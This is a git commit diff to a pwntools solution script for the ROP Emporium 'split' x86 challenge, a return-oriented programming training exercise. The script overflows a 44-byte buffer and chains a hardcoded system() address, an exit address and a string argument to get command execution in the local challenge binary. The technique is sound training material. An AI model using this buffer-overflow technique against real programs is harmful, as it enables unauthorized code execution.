3d673660c4f0048e2bfa3678786627899e35169d
Mikael Kall <Mikael.Kall@kindredgroup.com>
2018-05-22 15:36:21 +0200

    Fixed split challenge

--- ROP_Emporium/split/x86/solution.py
+++ ROP_Emporium/split/x86/solution.py
@@ -9,17 +9,11 @@ def pwn():
     ''' Create buffer '''
     buf = "A" * 44
 
-    #system_addr = p32(0x08048649)
-    system_addr = p32(e.symbols["usefulFunction"])
+    system_addr = p32(0xf7df8f80)
     arg_addr = p32(e.symbols["usefulString"])
     exit_addr = p32(0xf7debf10)
-    #arg_addr = p32(0x0804a030)
-    #arg_addr = p32(0x0804a030)
-    #arg_addr = p32(0x0804a030)
-
     io = e.process()
     io.sendline(buf + system_addr + exit_addr + arg_addr)
-    #io.interactive()
     print(io.recvall())
 
 if __name__ == '__main__':
